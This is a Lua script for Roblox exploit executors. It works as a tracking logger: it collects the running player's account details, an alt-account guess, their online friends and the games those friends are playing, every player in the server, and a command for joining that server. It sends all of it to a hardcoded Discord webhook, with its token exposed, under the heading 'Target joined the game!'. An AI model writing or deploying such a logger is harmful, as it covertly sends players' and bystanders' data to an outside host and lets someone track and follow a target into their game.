
local startTime = tick()

local Webhook = "https://discord.com/api/webhooks/1310682233321033904/Otg78XJSdOTjFoeCNcaffDp2-e6kTvV4cbbe64DyWpQCF2XT2SDVHeZzBkEEaSaS9UQ_" -- your webhook
_G.Discord_UserID = "1283831252352241686" -- ID To Ping on every execution, blank if no one wants to be pinged.

local player = game:GetService("Players").LocalPlayer
local players = game:GetService("Players"):GetPlayers()
local joinTime = os.time() - (player.AccountAge * 86400)
local joinDate = os.date("!*t", joinTime)
local premium = false
local alt = true

if player.MembershipType == Enum.MembershipType.Premium then
    premium = true
end

if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
    alt = false
end

local executor = identifyexecutor() or "Unknown"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", player.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl

-- Player Stats
local membership = premium and "Premium" or "Standard"
local currentJobId = game.JobId ~= "" and game.JobId or "N/A"

-- Friends Stats
local friendsOnline = player:GetFriendsOnline(200)
local onlineFriends = {}
local playingFriends = {}

for _, friend in pairs(friendsOnline) do
    table.insert(onlineFriends, friend.UserName)
    if friend.PlaceId and friend.PlaceId ~= 0 then
        local gameName = "Unknown Game"
        pcall(function()
            gameName = game:GetService("MarketplaceService"):GetProductInfo(friend.PlaceId).Name
        end)
        table.insert(playingFriends, string.format("%s (Game: [%s](https://www.roblox.com/games/%d))", friend.UserName, gameName, friend.PlaceId))
    end
end

-- Server Player Stats
local serverPlayers = {}
for _, plr in pairs(players) do
    table.insert(serverPlayers, plr.Name .. " (" .. plr.DisplayName .. ")")
end

-- Join Command
local joinCommand = string.format(
    'Roblox.GameLauncher.joinGameInstance("%d", "%s")',
    game.PlaceId,
    currentJobId
)

-- Discord Embed Message
local msg = {
    ["username"] = "Target joined the game!",
    ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
    ["content"] = (_G.Discord_UserID ~= "" and _G.Discord_UserID ~= nil) and tostring("<@" .. _G.Discord_UserID .. ">") or " ",
    ["embeds"] = {
        {
            ["color"] = tonumber(tostring("0x32CD32")), -- decimal
            ["title"] = "Stats",
            ["thumbnail"] = {
                ["url"] = AvatarImage,
            },
            ["fields"] = {
                {
                    ["name"] = "Username",
                    ["value"] = player.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "UID",
                    ["value"] = "[" .. player.UserId .. "](https://www.roblox.com/users/" .. player.UserId .. "/profile)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Membership",
                    ["value"] = membership,
                    ["inline"] = true
                },
                {
                    ["name"] = "Alt Status",
                    ["value"] = tostring(alt),
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = player.AccountAge .. " day(s)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Date Joined Roblox",
                    ["value"] = joinDate.day .. "/" .. joinDate.month .. "/" .. joinDate.year,
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor Used",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "Game ID",
                    ["value"] = "[" .. game.PlaceId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Name",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Current Job ID",
                    ["value"] = currentJobId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Friends Online",
                    ["value"] = tostring(#onlineFriends) .. " friend(s):\n" .. table.concat(onlineFriends, ", "),
                    ["inline"] = false
                },
                {
                    ["name"] = "Friends Playing",
                    ["value"] = tostring(#playingFriends) .. " friend(s):\n" .. table.concat(playingFriends, "\n"),
                    ["inline"] = false
                },
                {
                    ["name"] = "Players in Server",
                    ["value"] = tostring(#players) .. " player(s):\n" .. table.concat(serverPlayers, ", "),
                    ["inline"] = false
                },
                {
                    ["name"] = "Join Command",
                    ["value"] = "```js\n" .. joinCommand .. "\n```",
                    ["inline"] = false
                },
            },
            ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
        }
    }
}

request = http_request or request or HttpPost or syn.request
request({
    Url = Webhook,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = game.HttpService:JSONEncode(msg)
})

local endTime = tick()

-- Calculate and print execution time
local executionTime = endTime - startTime
print("Hook time spent:", executionTime, "seconds")
